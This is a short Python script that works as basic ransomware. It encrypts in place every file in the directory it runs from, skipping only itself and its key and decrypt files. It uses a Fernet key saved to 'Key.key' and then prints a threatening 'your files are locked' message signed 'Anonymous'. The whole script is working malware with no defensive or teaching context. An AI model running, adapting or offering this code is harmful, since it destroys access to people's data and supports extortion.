#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
#find files in directory


files = []

for file in os.listdir():
	if file == "Error.py" or file == "Key.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

key = Fernet.generate_key()

with open("Key.key", "wb") as Key:
	Key.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
print("All of your files are locked until further notice From Anonymous for we see all.")
